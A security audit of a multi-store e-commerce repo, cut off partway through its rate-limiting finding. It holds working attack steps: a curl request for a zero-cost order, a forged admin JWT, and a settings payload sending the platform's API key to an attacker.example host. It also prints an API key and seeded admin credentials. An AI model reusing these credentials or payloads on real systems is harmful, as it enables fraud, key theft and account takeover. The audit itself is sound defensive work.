# GLstore — Security Audit

**Date:** 2026-07-31 · **Branch:** `gaming-store` · **Tree:** clean at `760b8b7`
**Scope:** whole repo (source, docs, seeds, config, git history, both frontends, workers, deploy path)
**Method:** every claim below was read from source. Findings are **CONFIRMED** (I read the file and cite `file:line`) or **SUSPECTED** (inferred, runtime not exercised).
**Read-only:** no source file was modified, staged, or committed.

Read `audit/_shared_context.md` and `audit/Architecture.md` first — this report deepens the security half of that model and does not repeat its non-security findings.

---

## 0. Executive summary

| # | Finding | Severity | Exploitability |
|---|---|---|---|
| F1 | Live API key + RSA private key committed to git (`.obsidian/…/data.json`) | **Critical** | Trivial — `git clone` |
| F2 | Order total is client-controlled — `discount_amount` on a public endpoint | **Critical** | Trivial — one unauthenticated `curl` |
| F3 | Cross-tenant *write*: intel/scrape enqueue has no store predicate (incl. a **catalog-wide bulk** variant) | **Critical** | Low effort, any `OPERATOR` |
| F4 | Every admin account is a platform operator — no way to create a store-scoped one | **High** | Structural; the tenancy 403 branch is dead in practice |
| F5 | Cross-tenant read/write of orders + event payloads via `/jobs` console (9 endpoints) | **High** | Any `VIEWER` of any store |
| F6 | `app_settings` is global → cross-tenant config write **and** LLM API-key exfiltration | **High** | Any store `ADMIN` |
| F7 | Placeholder `JWT_SECRET` is committed and boots without complaint | **High** | Anyone who has seen the repo → forged `SUPER_ADMIN` |
| F8 | Seeded admin credential: rotation advice is real but **misplaced and self-reverting** | **High** | Public window during deploy; silently undone by a re-seed |
| F9 | Unauthenticated enumeration of unpublished catalog (3 public endpoints) | **Medium-High** | Trivial, unthrottled |
| F10 | Rate limiter + login IP tracker trust `X-Forwarded-For`; GETs entirely exempt | **Medium** | Trivial header rotation |
| F11 | No `Content-Security-Policy` (CLAUDE.md claims there is one) | **Medium** | Amplifier for F16 |
| F12 | No token revocation, no logout, no password-change endpoint | **Medium** | Post-compromise persistence up to 60 min |
| F13 | `GET /events/{event_id}` cross-tenant read | **Medium** | `ADMIN` of any store |
| F14 | `.env` is not in `.vercelignore` | **Medium** | Deploy-time secret sprawl |
| F15 | Unvalidated enum query params reach Postgres → unauthenticated 500 | **Low-Medium** | Trivial |
| F16 | DOM XSS sink in `gaming-store` search overlay | **Low** | Self-XSS only |
| F17 | Compose: API on `0.0.0.0:8000` with `--reload`; default DB password `glstore` | **Low** | LAN-local |
| F18 | **SQL injection: none found** — positive result, with the proof | — | — |

**The one-sentence version:** the multi-store boundary is *well designed and correctly applied in 10 of 17 route modules*, but 23 mounted endpoints across `intel.py` / `scraper.py` / `jobs.py` have **zero** store predicate, `app_settings` is global by construction, and — worse than any single missing `WHERE` — there is **no way to provision a store-scoped admin account**, so today every authenticated operator is a platform operator with reach into every brand.

---

## 1. The multi-tenant boundary — complete enumeration

Counts from `grep -c` per file; scoping verified by reading each endpoint.

### 1.1 Where it IS enforced ✅

| Module | Endpoints | Mechanism | Verified |
|---|---|---|---|
| `catalog.py` | 5 | `require_store` (Host) | every query carries `store_id = :store_id` (`:36,:56,:76,:127,:292`) |
| `public_orders.py` | 2 | `require_store` | `o.store_id = :sid` (`:60`), `o.store_id = :sid` (`:153`) |
| `orders.py` | 5 | create → `require_store`; 4 admin → `require_admin_store_for` | service threads `store.id` into every INSERT (`services/orders.py:38,132,168`) and every admin SELECT/UPDATE (`:209,:236,:248,:273`) |
| `products.py` | 8 | GET ×2 `require_store`; write ×6 `require_admin_store_for` | all SQL carries `store_id`; 404-not-403 on foreign product (`:199-202`) |
| `images.py` | 5 | `require_admin_store_for` | `store_id = :sid` in all 8 statements (`:58,:117,:133,:142,:157,:183,:192,:199`) |
| `enrichment.py` | 5 | `require_admin_store_for` + `_assert_product_in_store()` (`:31-38`) | the canonical guard; reuse this |
| `issues.py` | 4 | `require_admin_store_for` | `p.store_id = :sid` in every WHERE (`:44,:98,:202,:249`) |
| `products_import.py` | 2 | `require_admin_store_for` | `store.id` passed to `csv_import` |
| `events.py` POST | 1 | `require_admin_store_for` | `:20,:45` |
| `stores.py` | 2 | explicit `admin.store_id` comparison (`:59,:86`) | correct |

### 1.2 Where it is NOT enforced ❌

| Module | Endpoints | Store predicate | Consequence |
|---|---|---|---|
| `intel.py` | **5** | none — module never imports `store_context` | cross-tenant **write** (F3) |
| `scraper.py` | **9** | none — module never imports `store_context` | cross-tenant write + market-data read (F3) |
| `jobs.py` | **9** | none | cross-tenant read of order events + write via retry (F5) |
| `settings.py` | **6** | none — `app_settings` is a global k/v table | cross-tenant config write + key theft (F6) |
| `events.py` GET | 1 | none (`:58-77`) | cross-tenant event read (F13) |
| `health.py` `/healthz/details` | 1 | none — platform-wide `COUNT(*)` (`core/health.py:119-126`) | cross-tenant volume metrics to any `VIEWER` |
| `products_export.py` | 3 | none | unmounted; booby-trapped (see §4) |

**31 of 76 endpoints sit outside the boundary.** 23 of those are mounted, authenticated, and reachable today.

### 1.3 The design is sound — the application is not

`api/core/store_context.py:15-22` states the rule correctly ("Host is a routing signal, not an authorization signal"), `require_admin_store_for` (`:235-293`) implements a correct three-way decision (scoped operator → own store; foreign `x-store-id` → 403; platform operator → must name a store), and `enrichment.py:31-38` already contains the exact helper the missing modules need. **This is an application gap, not a design gap** — which is good news for the fix.

---

## 2. Critical findings

---

### F1 — CRITICAL — A live API key and RSA private key are committed to this repository

**CONFIRMED.**

`.obsidian/plugins/obsidian-local-rest-api/data.json` is **tracked in git and present in `HEAD`**:

```
$ git cat-file -p HEAD:.obsidian/plugins/obsidian-local-rest-api/data.json
{ "port": 27124, "insecurePort": 27123, "enableInsecureServer": false,
  "apiKey": "e45454c74feb82d97ef04cc28e42bc27981f33434c345a790aaa522817373848",
  "crypto": { "cert": "…", "privateKey": "-----BEGIN RSA PRIVATE KEY-----…" } }
```

Added in commit `973c756` ("shipping the first MVP of my ecommerce manager platform"). **100 files under `.obsidian/` are tracked** (`git ls-files | grep -c '^\.obsidian'` → 100).

`.gitignore` covers `node_modules/`, `__pycache__/`, `.env`, `.superpowers/`, `.vercel/` — **not `.obsidian/`**.

**Attack scenario.** `DEPLOY.md:38` instructs the owner to *"push this repo to GitHub"*. The moment that repo is public (or shared with any collaborator, contractor, or CI service), the attacker has:
1. The bearer token for the Obsidian Local REST API on `https://127.0.0.1:27124` — that plugin exposes **full read/write access to the user's Obsidian vault**, which per the global config includes `VEEMO CORTEX`, `GHI LAFFAIRE`, and `ALLIANCE PWA PROTOTYPE`.
2. The matching **RSA private key and self-signed cert**, so they can also impersonate that endpoint.

The listener binds loopback, so remote exploitation needs a foothold on the machine, a malicious local process, or a browser-side request to `127.0.0.1:27124` from a page the user visits (the plugin's CORS posture decides that). But the token is now permanent in git history — rotating the plugin key does not un-publish it.

**Fix (in this order):**
1. In Obsidian → Local REST API plugin → **regenerate the API key** and **regenerate the certificate**. Do this first; everything else is cleanup.
2. `git rm -r --cached .obsidian/` and add `.obsidian/` to `.gitignore`.
3. Because the secret is in history, either (a) accept that the *old* key is burned and rely on step 1, or (b) rewrite history with `git filter-repo --path .obsidian --invert-paths` **before** the repo is ever pushed. If it has already been pushed anywhere, step 1 is the only thing that actually helps.
4. Add a pre-commit secret scanner (`gitleaks`, `detect-secrets`) so this class stops recurring.

> The vault plugin is not part of GLstore's runtime. It is in scope because it is in *this repository*, and this repository is documented as something to push to GitHub.

---

### F2 — CRITICAL — The customer sets their own order total

**CONFIRMED.**

`api/models/schemas.py:122-123`:
```python
shipping_cost:   Decimal = Field(default=Decimal("0"), ge=0)
discount_amount: Decimal = Field(default=Decimal("0"), ge=0)
```

`api/services/orders.py:124-126`:
```python
total = (subtotal + dto.shipping_cost - dto.discount_amount).quantize(Decimal("0.01"))
if total < 0:
    raise HTTPException(status.HTTP_400_BAD_REQUEST, "total cannot be negative")
```

`subtotal` is computed server-side from the offers' real prices (`:114-119`) — that part is correct. But `discount_amount` and `shipping_cost` arrive **verbatim from the request body**, and the only check is `total >= 0`. There is no coupon table, no discount policy, no shipping-rate table, and nothing in `create_order` or `POST /orders/create` (`api/routes/orders.py:20-33`) validates them.

`POST /api/v1/orders/create` is **public and unauthenticated** (`require_store` only). Rate limiting applies (non-GET), but at 60/min that's 60 free orders per minute per forged `X-Forwarded-For` (see F10).

**Attack scenario.**
```bash
# 1. read a real offer_id — no auth needed
curl -s "$BASE/api/v1/products?page_size=1"

# 2. order a 89 000 DZD item for 0 DZD
curl -X POST $BASE/api/v1/orders/create -H 'Content-Type: application/json' -d '{
  "customer_name":"M","customer_phone":"0555000000",
  "items":[{"offer_id":"<real-uuid>","quantity":1}],
  "shipping_address":{"wilaya":"Alger","commune":"Centre","street":"1 rue"},
  "payment_method":"COD",
  "shipping_cost":0,
  "discount_amount":89000
}'
```
Result: `orders.total = 0.00`, `order_items.line_total = 89000.00` (the CHECK on `order_items` is per-line and still passes), status → `RESERVED`, `fn_reserve_stock` holds the inventory, `order.created` fires. The `orders` CHECK `total = subtotal + shipping + tax − discount` is *satisfied* — the constraint validates arithmetic, not authorisation.

For a **COD business this is the whole loss**: the delivery agent collects `orders.total`. The goods ship for free. Secondary impact: `shipping_cost:0` on every order, and stock exhaustion (F2 + no worker on Vercel = permanent holds; see Architecture §7.11).

**Fix.** Remove both fields from `OrderCreate`. Compute them server-side:
```python
# api/services/orders.py — replace line 124
shipping_cost = await resolve_shipping_cost(db, store.id, dto.shipping_address.wilaya)
discount_amount = await resolve_discount(db, store.id, dto.coupon_code)  # or Decimal("0")
total = (subtotal + shipping_cost - discount_amount).quantize(Decimal("0.01"))
```
Until a shipping/coupon table exists, hard-code `discount_amount = Decimal("0")` and derive shipping from a per-store wilaya rate map. If the storefront must display shipping before submit, expose a `GET /shipping-quote?wilaya=…` and have the server recompute at order time regardless of what the client sends. **Never trust a money field that crosses the wire inbound.**

---

### F3 — CRITICAL — Cross-tenant write: intel and scrape enqueue have no store predicate, and the bulk variant is catalog-wide

**CONFIRMED.** This extends `Architecture.md §7.1` — the *bulk* endpoint is materially worse than the single one and was not called out.

**Single-product (`api/routes/intel.py:48`, `api/routes/scraper.py:60-62`):**
```python
exists = await db.execute(text("SELECT 1 FROM products WHERE id = :id"), {"id": product_id})
```
No `store_id`. Gated only by `require_role(*WRITE_ROLES)` — held by any `OPERATOR` of any store.

**Bulk (`api/routes/intel.py:125-155`) — worse:**
```python
where: list[str] = ["p.status <> 'ARCHIVED'"]          # :125 — no store filter, ever
...
rows = await db.execute(
    text(f"SELECT p.id FROM products p WHERE {where_sql} ORDER BY p.completeness_score ASC LIMIT :lim"),
    params,                                             # :151-154
)
```
`limit` accepts up to **2000** (`:111`). A single `POST /api/v1/products/intel-bulk {"only_status":["ACTIVE"],"limit":2000}` from an `OPERATOR` of store A enqueues intel jobs against **the 2000 lowest-completeness products on the entire platform**, across every brand.

**What the job then does** — `api/services/full_intel.py`:
- `:243` `UPDATE products SET brand=…, category=…, description=… WHERE id = :id` — **no `store_id` in the WHERE**
- `:315` `INSERT INTO product_media … SELECT :id, p.store_id, …` — writes images into the victim store
- `:344` `INSERT INTO observations … SELECT p.store_id, …` — writes audit rows into the victim store

So the attacker doesn't just *read* another brand's catalog — the pipeline **overwrites their product descriptions and specs and injects images into their review queue**, attributed to the victim store.

**Product UUIDs are trivially harvestable across tenants**: `GET /jobs` (F5), `GET /intel-jobs/{id}` (`intel.py:216`), `GET /jobs/scrape/{id}` (`jobs.py:266`) and `GET /scrape-jobs/{id}` (`scraper.py:160`) all return `product_id` for every store, to any `VIEWER`.

**That this is an oversight, not policy, is provable:** `api/routes/enrichment.py:31-38` defines exactly the right guard and calls it on every enrichment endpoint. `intel.py` and `scraper.py` import `api.core.security` but never `api.core.store_context` — `grep -c store_context api/routes/{intel,scraper,jobs}.py` → `0 0 0`.

**Fix.**
1. Add `store: Store = Depends(require_admin_store_for(require_role(*WRITE_ROLES)))` to all 5 `intel.py` and 9 `scraper.py` endpoints.
2. Replace `SELECT 1 FROM products WHERE id = :id` with a call to a shared `_assert_product_in_store(db, product_id, store.id)` (lift `enrichment.py:31-38` into `api/core/store_context.py` so all modules use one copy).
3. In `enqueue_intel_bulk`, seed the WHERE list with `"p.store_id = :sid"` — **not** as an optional filter but as the first, non-removable clause.
4. Add `store_id = :sid` to the WHERE at `full_intel.py:243` as defence in depth, so a future unscoped caller cannot cross-write either.
5. `intel_jobs` / `scrape_jobs` are deliberately unscoped tables (`005_stores.sql:11-14`) — that is fine for *market research*, but the read endpoints must join through `products` and filter on `p.store_id`.

---

## 3. High findings

---

### F4 — HIGH — Every admin is a platform operator; there is no way to create a store-scoped one

**CONFIRMED — and this is the finding that makes the whole tenancy model theatre today.**

`require_admin_store_for` has two branches (`store_context.py:262-284`):
- `admin.store_id is not None` → locked to their store, foreign `x-store-id` → **403**
- `admin.store_id is None` → **platform operator**, may name *any* store via `x-store-id`

Now trace how an `admin_users` row is ever created. Repo-wide grep for writes to `admin_users`:

| Site | What it does |
|---|---|
| `scripts/create_admin.py:31-45` | `INSERT INTO admin_users (id, email, password_hash, full_name, role, is_active, failed_attempts, locked_until)` — **`store_id` is not in the column list** |
| `db/seed_admin.sql:17-30` | same — no `store_id` |
| `api/routes/auth.py:141,157` | UPDATE of `failed_attempts` / `last_login_at` only |

There is **no admin-user CRUD route anywhere** (`api/routes/` has no `admin_users.py`; `stores.py` only reads). Migration `005_stores.sql:118` adds the column as nullable with no backfill (`:115-118` states this is intentional).

**Therefore every account that exists has `store_id IS NULL`, i.e. is a platform operator.** The 403 branch is unreachable. An `OPERATOR` — the lowest write role — can send `x-store-id: <any-store-uuid>` and get full write access to that brand's catalog, orders, images and imports, through the *correctly scoped* modules.

**Attack scenario.** You hire a contractor to manage the GLAIVE brand and create them an `OPERATOR` account. `GET /api/v1/stores` (`stores.py:52-63`) returns **every store on the platform** to them, because `admin.store_id is None`. They pick Ghir Laffaire from the store picker, and `PATCH /products/{id}`, `POST /orders/{id}/cancel`, `POST /products/import/commit` all succeed against a brand they were never granted.

**Fix.**
1. Add `store_id` to `scripts/create_admin.py` (a `--store-slug` argument, required unless `--platform-operator` is passed explicitly).
2. Ship an admin-user management router (`SUPER_ADMIN`-only) that requires an explicit store assignment, with `store_id IS NULL` as an opt-in checkbox labelled "platform operator — can act on every brand".
3. Make `require_role` store-aware for the roles that should never be platform-wide: an `OPERATOR` or `VIEWER` with `store_id IS NULL` should be rejected at token-issue time, not silently promoted.
4. Note the JWT trade-off already documented at `security.py:72-74` — `store_id` rides in the token, so a re-assignment takes effect on next login. With F12 (no revocation) that window is up to 60 minutes.

---

### F5 — HIGH — The `/jobs` console is a cross-tenant read *and write* channel

**CONFIRMED.** `api/routes/jobs.py` — 9 endpoints, zero store predicate anywhere in the file.

**Reads.**
- `GET /jobs/stats` (`:45-80`) — `SELECT status, COUNT(*) FROM scrape_jobs|events|sync_queue GROUP BY status`, platform-wide.
- `GET /jobs` (`:87-223`) — `UNION ALL` across all three tables with **no** WHERE on store. The `label` column for scrape rows is `'scrape · ' || (SELECT sku FROM products WHERE id = product_id)` (`:124`) — **it leaks every store's SKUs**. `?q=` does an `ILIKE` over that label (`:180`), so it is a cross-tenant SKU search box.
- `GET /jobs/event/{id}` (`:283-315`) — returns the **raw `payload` JSONB** of any event, any store. For orders that payload is `{"order_number": …, "total": …}` (`services/orders.py:200`) and `{"reason": …}` on cancel (`:279`) — a competitor's order numbers, revenue per order, and cancellation reasons.
- `GET /jobs/sync/{id}` (`:318-345`) — same for `sync_queue.payload`.

All four are `require_role(*READ_ROLES)` where `READ_ROLES` includes **`VIEWER`** (`:35`).

**Writes.**
- `POST /jobs/scrape/{id}/retry` (`:352`) — resets any store's scrape job, including `COMPLETED` ones (`:363`), causing a re-scrape at the victim's cost/ban risk.
- `POST /jobs/event/{id}/retry` (`:395`) — resets any store's event to `PENDING`, **including `COMPLETED`** (`:405`). `event_worker` will re-fan-out to `sync_queue`. If the sync target is ever wired to a real shipper/accounting system (it is a stub today — `Architecture.md §3`), this is a **replay-a-competitor's-order-fulfilment primitive**.
- `POST /jobs/sync/{id}/retry` (`:414`) — same, including `SYNCED` (`:422`).

**Attack scenario.** A `VIEWER` account on brand A — the least-privileged role that exists, the one you'd hand to an intern — calls `GET /api/v1/jobs?type=event&page_size=200`, walks the ids, and calls `GET /api/v1/jobs/event/{id}` for each. They now have brand B's complete order ledger: order numbers, totals, timing, cancellation reasons. Then they `POST /api/v1/jobs/event/{id}/retry` on brand B's `order.confirmed` events to re-trigger downstream fulfilment.

**Fix.** Every one of the nine must resolve a store and filter:
- `events` and `sync_queue` carry `store_id NOT NULL` (`005_stores.sql:150-160`) — add `AND store_id = :sid` directly.
- `scrape_jobs` is unscoped by design — join through `products`: `JOIN products p ON p.id = sj.product_id WHERE p.store_id = :sid`.
- Add `store: Store = Depends(require_admin_store_for(require_role(*READ_ROLES)))` to all 9.
- Separately: `retry_scrape` accepting `COMPLETED` (`:363`), `retry_event` accepting `COMPLETED` (`:405`) and `retry_sync` accepting `SYNCED` (`:422`) is a re-execution primitive even *within* one store. Restrict retry to `FAILED`/`CANCELLED`/`RETRYING`; make "re-run a completed job" a separate, explicitly named endpoint.

---

### F6 — HIGH — `app_settings` is global: cross-tenant config write, and a working LLM-API-key exfiltration path

**CONFIRMED.**

`api/routes/settings.py` has **no store dependency on any of its 6 endpoints** — the module never imports `store_context`. Every read and write targets the global `app_settings` k/v table.

**(a) Cross-tenant configuration write.** `PUT /settings/theme?scope=storefront` (`settings.py:314-337`) writes `app_settings['storefront.theme']`. `GET /storefront/theme` (`:349-359`) is the public, unauthenticated endpoint every storefront bootstraps from. An `ADMIN` of brand A therefore **restyles every brand on the platform**. Same for `PUT /settings/llm` (`:49`) and `PUT /settings/scraper` (`scraper.py:430`). `stores.theme` exists (`005_stores.sql:36-38`) and is returned by `GET /stores` (`stores.py:34,48`) but is rendered by nothing.

The override sanitiser (`:206-269`) is genuinely good — whitelisted tokens, per-kind regexes, numeric bounds, `url()`/`expression()` blocked by `_FONT_RE`. **The CSS injection surface is closed.** The problem is purely *who* may write, not *what*.

**(b) LLM API-key exfiltration — the sharp edge.** `LLMConfigIn.endpoint` (`settings.py:33`) is `str = Field(min_length=4, max_length=500)`. No scheme check, no host allowlist, no SSRF guard. And the key-handling contract at `:56-65` is:
> `None` → clear it · `""` → **keep existing** · else → overwrite

So an `ADMIN` of brand A can submit `{"kind":"openai_compat","endpoint":"https://attacker.example/v1","model":"x","api_key":""}` — keeping the platform's real key while repointing the endpoint. Then `api/services/llm.py:201-203`:

```python
headers = {"Content-Type": "application/json"}
if cfg.api_key:
    headers["Authorization"] = f"Bearer {cfg.api_key}"
```

Any subsequent LLM call — `POST /settings/llm/ping` (`settings.py:83`, which only needs `OPERATOR`), `POST /products/{id}/enrich-llm`, or the intel worker — sends **`Authorization: Bearer <the platform's real key>` to the attacker's server**. `_openai_models` (`llm.py:232-245`) does the same on the ping path. `_anthropic_chat` (`:252-255`) sends it as `x-api-key`.

`to_safe_dict()` (`llm.py:58-66`) masks the key on read, and `_mask_keys` (`scraper.py:404-413`) does the same for `brave_api_key`/`tier4_api_key` — the masking is correct. It just doesn't matter when the key can be *used* against an attacker-chosen host.

**(c) SSRF.** The same unvalidated endpoint gives internal network reach:
- `POST /settings/llm/ping` → `GET {endpoint}/api/tags` or `/v1/models` (`llm.py:180,234`), with the parsed JSON model list **returned in the response body** (`settings.py:87-92`) — a partial-read SSRF oracle.
- `POST /settings/scraper/probe` (`scraper.py:462-506`) → `GET {searxng_url}/search`, status code echoed (`:479-481`) — blind SSRF, `READ_ROLES` (incl. `OPERATOR`).
- `GET /readyz` (`health.py:89`) is **unauthenticated** and fetches `searxng_url` from `app_settings` (`:42-59`) — so once an `ADMIN` has poisoned that value, *anonymous* callers drive the outbound request.

**Attack scenario.** You onboard a second brand and give its owner `ADMIN` on their own store. Within one session they: (1) read `GET /settings/llm` to learn the platform is on `anthropic`; (2) `PUT /settings/llm` with `api_key:""` and `endpoint:"https://collector.attacker.tld"`; (3) `POST /settings/llm/ping`. Your Anthropic key is now in their logs. They also just repointed *your* LLM pipeline and *your* storefront theme.

**Fix.**
1. Move `storefront.theme` and `admin.theme` into `stores.theme` (the column already exists). Make `GET /storefront/theme` take `Depends(require_store)` and read `store.theme`. Make `PUT /settings/theme` take `require_admin_store_for(...)`.
2. Restrict `PUT /settings/llm` and `PUT /settings/scraper` to `SUPER_ADMIN` **with `store_id IS NULL`** (a true platform operator) — these are platform-level infrastructure knobs, not per-brand settings. Add an explicit `require_platform_operator` dependency.
3. Validate `endpoint` / `searxng_url`: require `https://` (or `http://` only for RFC1918 hosts you explicitly allowlist), reject link-local (`169.254.0.0/16`), loopback, and metadata hostnames. Resolve-then-pin the IP before the request.
4. Change the `""` = "keep existing key" semantics: **rotating the endpoint must clear the key.** Any write that changes `endpoint` should force `api_key` to be re-supplied.
5. `POST /settings/llm/ping` and `POST /settings/scraper/probe` should be `SUPER_ADMIN`, not `READ_ROLES`.

---

### F7 — HIGH — A placeholder `JWT_SECRET` is committed, and the app boots happily with it

**CONFIRMED.**

`.env.example:16` (tracked):
```
JWT_SECRET=replace_with_64_char_random_string
```

The working `.env` on this machine still contains that exact value (verified; `.env` itself is correctly gitignored and untracked). `api/core/config.py:39` declares `jwt_secret: str` with **no default and no validator** — so the app refuses to boot without *a* secret, but accepts the committed placeholder without a murmur.

`api/core/security.py:41,46` signs and verifies with it: `jwt.encode(payload, _settings.jwt_secret, algorithm=_settings.jwt_algorithm)`.

**Attack scenario.** Anyone with read access to this repo (or to `.env.example` on GitHub) knows the string. If any environment — a staging box, a demo instance, a Docker stack a teammate spun up with `cp .env.example .env` — kept the placeholder, they can mint their own token:
```python
jwt.encode({"sub": str(uuid4()), "role": "SUPER_ADMIN", "email":"x@x",
            "store_id": None, "type":"access",
            "iat": now, "exp": now+3600},
           "replace_with_64_char_random_string", algorithm="HS256")
```
`get_current_admin` (`security.py:67-83`) performs **no database lookup** — it trusts the token's `sub`, `role` and `store_id` wholesale (documented as a deliberate trade-off at `:72-74`). So a forged token needs no corresponding `admin_users` row. Full `SUPER_ADMIN` + platform-operator, on every store.

**Same class, same file:** `.env.example:8-10` ships `POSTGRES_PASSWORD=change_me_in_production` and a `DATABASE_URL` embedding it; `docker-compose.yml:7` defaults to `POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-glstore}`.

**Fix.** Add a boot-time validator in `config.py`:
```python
@field_validator("jwt_secret")
@classmethod
def _reject_weak(cls, v: str, info) -> str:
    if len(v) < 32 or v in _KNOWN_PLACEHOLDERS:
        raise ValueError("JWT_SECRET is a placeholder or too short — generate one: "
                         "python -c \"import secrets; print(secrets.token_urlsafe(64))\"")
    return v
```
where `_KNOWN_PLACEHOLDERS` contains every value shipped in `.env.example`. Do the same for `database_url` containing `change_me_in_production` when `environment == "production"`. **Fail closed at startup — a placeholder secret must crash the container, not serve traffic.**

*Positive note on JWT handling:* `decode_token` (`security.py:46`) passes `algorithms=[_settings.jwt_algorithm]` — a single-element allowlist, so the classic `alg: none` / HS-vs-RS confusion attack is closed. `exp` is set (`:36`) and PyJWT enforces it by default. `type: "access"` is checked (`:69`). bcrypt with `rounds=12` (`config.py:43`, `security.py:16-27`) is a correct password hash with a correct cost.

---

### F8 — HIGH — The seeded admin credential: rotation advice is real, but misplaced and self-reverting

**You asked me to assess whether the guidance is sufficient and correctly placed. It is neither.**

**What is committed** — `db/seed_admin.sql:8-10`, in a comment:
```
--   email:    brvetr4veler@gmail.com
--   password: brveadmin
```
plus the bcrypt hash at `:22`. This is the owner's real email address, and it is also the login identity (`admin_users.email` stays globally unique — `005_stores.sql:189`).

**Three concrete problems with the current guidance:**

**(a) It is placed after the store is already public.** `DEPLOY.md` runs: Step 4 deploy → Step 5 *"Verify it's live"* with public `curl`s → *then*, at `:172`, "🔒 Before you share the link: rotate the admin password". By the time the reader reaches line 172 they have a public `*.vercel.app` URL serving `POST /api/v1/auth/login` with a credential printed in the repo. The section heading says "before you share the link" — but the link exists and is reachable from Step 4 onward, and Vercel deployment URLs are enumerable (they appear in certificate transparency logs). **The rotation step belongs between Step 2 (DB init) and Step 4 (deploy), and it should be a numbered step, not an appendix.**

**(b) The seed silently reverts the rotation.** `db/seed_admin.sql:31-36`:
```sql
ON CONFLICT (email) DO UPDATE SET
    password_hash   = EXCLUDED.password_hash,
    is_active       = true,
    failed_attempts = 0,
    locked_until    = NULL,
    role            = EXCLUDED.role;
```
This is an **upsert that overwrites the password back to `brveadmin`** and unlocks the account. It runs:
- on every fresh Docker volume (`docker-compose.yml:12` mounts it as `01-seed_admin.sql` in `docker-entrypoint-initdb.d`), and
- from `scripts/deploy/init_remote_db.py:105`, whose file list is `("schema.sql", "seed_admin.sql", "seed_gaming.sql")` — so **`init_remote_db.py --force` (documented at `DEPLOY.md:233` as the fix for "DB init says already initialized") resets a rotated production password to the public one, with no warning.**

`scripts/create_admin.py` has the same `ON CONFLICT DO UPDATE SET password_hash` (`:36`) — that one is at least intentional and interactive.

**(c) The rotation SQL is incomplete.** `DEPLOY.md:182-183` updates only `password_hash`. It does not clear `locked_until`, and — because there is no token revocation (F12) — any JWT minted with the old password stays valid for its full 60-minute TTL.

**Attack scenario.** Owner follows DEPLOY.md top to bottom. Between Step 4 (deploy completes, URL live) and Step 5 completion, an attacker who has the repo — or who finds it later and checks whether the credential still works — POSTs `{"email":"brvetr4veler@gmail.com","password":"brveadmin"}` to `/api/v1/auth/login` and receives a `SUPER_ADMIN` platform-operator token. Months later, the owner hits the "already initialized" troubleshooting row, runs `--force`, and the credential is live again with nothing in any log to say so (`audit_log` is dead schema — `Architecture.md §7.6`).

**Fix.**
1. **Change the seed's conflict behaviour to `ON CONFLICT (email) DO NOTHING`.** A seed's job is to bootstrap, not to reset. Add a loud comment saying re-running will not clobber a rotated password.
2. **Delete the plaintext password from the comment** at `seed_admin.sql:8-10`. Keep the hash (it's a bcrypt hash of a now-public string — rotate it too) but stop publishing the cleartext and the owner's email together.
3. **Move rotation to a numbered Step 3.5 in `DEPLOY.md`, before Step 4 (deploy).** Better: have `init_remote_db.py` *generate* a random password, print it once, and require the operator to store it — so no credential is ever in the repo.
4. Add a startup check: if `ENVIRONMENT=production` and any `admin_users.password_hash` matches the seeded hash, log a `CRITICAL` line on every boot.
5. Add `AND locked_until = NULL, failed_attempts = 0` to the documented rotation SQL.

---

## 4. Medium findings

---

### F9 — MEDIUM-HIGH — Unauthenticated enumeration of the unpublished catalog

**CONFIRMED.** Three public endpoints leak pre-launch inventory.

**(a) `GET /api/v1/products`** (`products.py:70-84`) — no auth dependency, only `require_store`. Lines 89-94:
```python
# Default: only show non-archived. Caller can pass status= to override.
if status_filter:
    where.append("p.status = :st"); params["st"] = status_filter
else:
    where.append("p.status <> 'ARCHIVED'")
```
`?status=RAW`, `?status=NEEDS_FIX`, `?status=ARCHIVED` all work anonymously. The response includes `sku`, `specs`, `completeness_score`, `status`, `min_price`, `available` (`:150-160`).

**(b) `GET /api/v1/products/{id}`** (`products.py:181-252`) — the WHERE is `id = :id AND store_id = :store_id` (`:193`) with **no status predicate at all**, and it returns `purchase_price` on every offer (`:207,:219`) — **your cost basis, publicly**. That is a margin leak, not just a catalog leak.

**(c) `GET /api/v1/products/graph`** (`catalog.py:87-271`) — public, and `only_status` (`:91`) is an arbitrary caller-supplied list injected as `status = ANY(:statuses)` (`:129-131`). With `?include_products=true&product_limit=4000&only_status=RAW` an anonymous caller downloads up to 4000 product nodes with `sku`, `name`, `brand`, `category`, `status`, `completeness_score` and `primary_image` — sorted **lowest completeness first** (`:215`), i.e. deliberately surfacing your least-finished work.

None of these are rate-limited: `api/main.py:110` skips the limiter entirely for `GET`.

**Attack scenario.** A competitor scripts `GET /products?status=RAW&page_size=120` across pages, then `GET /products/{id}` per hit. They obtain your entire unlaunched roadmap plus `purchase_price` for every variant — enough to undercut you on every SKU before you launch it.

**Fix.**
- Split the endpoint by audience. Public callers get a server-pinned `p.status = 'ACTIVE'`; the `status=` override requires `require_role(*READ_ROLES)`. The cleanest shape: make `list_products` take an optional admin dependency and branch:
  ```python
  if admin is None:
      where.append("p.status = 'ACTIVE'")   # not negotiable
  elif status_filter:
      where.append("p.status = :st"); params["st"] = status_filter
  ```
- Add `AND status = 'ACTIVE'` to `get_product`'s WHERE for unauthenticated callers, and **drop `purchase_price` from the public response shape entirely** (`products.py:207,219`) — it should never leave the admin surface.
- Move `/products/graph` behind `require_admin_store_for(require_role(*READ_ROLES))`. It is described in its own docstring (`catalog.py:95`) as *"used by the admin's Obsidian-style explorer"* — it has no storefront consumer.

---

### F10 — MEDIUM — Rate limiter and login IP tracker are bypassable by header; GETs are exempt entirely

**CONFIRMED** (deeper than `CLAUDE.md §9.5`, which records only the multi-replica issue).

`api/core/ratelimit.py:32-36`:
```python
def client_key(request: Request) -> str:
    xff = request.headers.get("x-forwarded-for")
    if xff:
        return xff.split(",")[0].strip()
    return request.client.host if request.client else "unknown"
```
Whenever `X-Forwarded-For` is present it is trusted **unconditionally** — no trusted-proxy list, no hop counting, no check that the request actually came through a proxy. Any client sends `X-Forwarded-For: <random>` and gets a fresh bucket on every request.

`api/routes/auth.py:83-94` (`_client_ip`) has the identical flaw, and its docstring is wrong: *"Honors X-Forwarded-For when proxy is trusted"* — there is no trust check. So the per-IP login throttle (`:108-114`, 10 fails / 5 min) is defeated by rotating one header. The per-account `locked_until` (5 fails → 15 min, `:143-146`) still holds, and that is the layer actually protecting you — but note it is also a **cheap account-lockout DoS**: 5 wrong passwords against a known email locks the operator out for 15 minutes, repeatable forever, and the only admin email is published in `seed_admin.sql`.

Two further issues:
